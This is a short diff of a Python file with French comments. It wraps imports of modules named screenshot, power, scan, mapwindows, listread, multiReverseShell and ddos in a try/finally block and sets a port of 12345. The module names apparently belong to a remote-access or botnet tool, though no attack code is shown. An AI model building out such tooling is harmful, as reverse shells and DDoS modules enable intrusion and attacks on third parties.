@@ -1,6 +1,9 @@
 # importations et variables
 import requests, time, sys
-import screenshot, power, scan, mapwindows, listread, multiReverseShell, ddos
+try :
+    import screenshot, power, scan, mapwindows, listread, multiReverseShell, ddos
+finally :
+    print('')
 
 PORT = 12345
 run = True
